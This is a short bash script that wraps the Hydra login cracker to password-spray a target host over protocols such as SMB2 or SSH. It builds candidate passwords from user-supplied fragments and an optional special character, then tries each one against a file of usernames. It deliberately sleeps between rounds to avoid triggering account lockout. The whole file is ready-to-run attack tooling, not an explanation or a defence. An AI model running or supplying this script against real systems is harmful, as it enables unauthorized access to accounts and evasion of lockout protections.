#!/bin/bash

# Prompt for password chunks
read -p "Enter password chunk 1: " CHUNK1
read -p "Enter password chunk 2: " CHUNK2
read -p "Enter special character (e.g., ! or leave blank): " SPECIAL

# Prompt for Hydra options
read -p "Enter user file (e.g., users.txt): " USERFILE
read -p "Enter target IP or hostname: " TARGET
read -p "Enter protocol (e.g., smb2, ssh): " PROTOCOL
read -p "Enter domain or module string (e.g., workgroup:{hiboxy}): " DOMAIN

# Prompt for wait time
read -p "Enter sleep time between attempts (in minutes): " SLEEP_MINUTES
SLEEP_SECONDS=$((SLEEP_MINUTES * 60))

# Confirmation
echo "Example password 1: ${CHUNK1}${CHUNK2}"
echo "Example password 2: ${CHUNK1}${CHUNK2}${SPECIAL}"
echo "Sleep time between attempts: $SLEEP_MINUTES minute(s)"
read -p "Proceed with these attacks? (y/n): " CONFIRM

if [[ "$CONFIRM" != "y" ]]; then
  echo "Aborted."
  exit 1
fi

# Loop over no-suffix and special char suffix
for suffix in "" "$SPECIAL"; do
  PASSWORD="${CHUNK1}${CHUNK2}${suffix}"
  echo "[*] Trying password: $PASSWORD"
  hydra -L "$USERFILE" -p "$PASSWORD" -m "$DOMAIN" "$TARGET" "$PROTOCOL"
  echo "[*] Sleeping $SLEEP_MINUTES minute(s) to avoid lockout..."
  sleep "$SLEEP_SECONDS"
done
